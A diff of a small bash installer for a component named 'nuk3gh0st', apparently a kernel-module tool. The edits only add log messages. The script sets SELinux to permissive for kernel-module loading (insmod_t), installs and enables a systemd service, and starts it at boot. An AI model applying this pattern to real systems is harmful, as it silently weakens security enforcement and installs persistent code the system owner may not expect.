@@ -1,12 +1,19 @@
 #!/bin/bash
-
-echo "cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service"
+echo "Coping nuk3gh0st.service to systemd startup scripts directory"
+echo "cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service"
 cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
+echo "Checking if SELINUX is enabled"
 if [ -f /usr/sbin/semanage ]; then
-	echo "semanage permissive -a insmod_t"
+	echo "SELINUX is enabled"
+	echo "Enabling insmod permissive mode"
+	echo "cmd: semanage permissive -a insmod_t"
 	semanage permissive -a insmod_t
+else
+	echo "SELINUX is disabled"
 fi
-echo "systemctl enable nuk3gh0st.service"
+echo "Enabling nuk3gh0st.service"
+echo "cmd: systemctl enable nuk3gh0st.service"
 systemctl enable nuk3gh0st.service
-echo "service nuk3gh0st start"
+echo "Starting nuk3gh0st.service"
+echo "cmd: service nuk3gh0st start"
 service nuk3gh0st start
